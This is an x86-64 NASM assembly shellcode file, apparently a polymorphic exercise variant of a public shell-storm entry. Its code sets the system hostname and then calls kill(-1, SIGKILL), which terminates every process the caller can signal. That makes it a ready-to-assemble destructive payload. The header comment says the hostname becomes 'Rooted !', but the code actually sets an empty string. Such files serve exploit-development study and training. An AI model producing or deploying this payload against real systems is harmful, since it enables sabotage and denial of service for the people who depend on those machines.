; From: http://shell-storm.org/shellcode/files/shellcode-605.php
; Filename: shellcode1.poly.nasm
; Author:  SLAE64 - 1525
;
; Purpose: sethostname() & killall

; sethostname("Rooted !");
; kill(-1, SIGKILL);
BITS 64

section .text

SYS_SETHOSTNAME equ 0xaa
SYS_KILL equ 0x3e

global _start
 
_start:
    ;-- setHostName("");
    xor r10, r10
    push byte SYS_SETHOSTNAME
    pop rax
    push r10
    push rsp
    pop rdi
        
    syscall
 
    ;-- kill(-1, SIGKILL);
    push byte SYS_KILL
    pop rax
    mov rdi, r10
    not rdi
    mov rsi, r10
    add rsi, 9

    syscall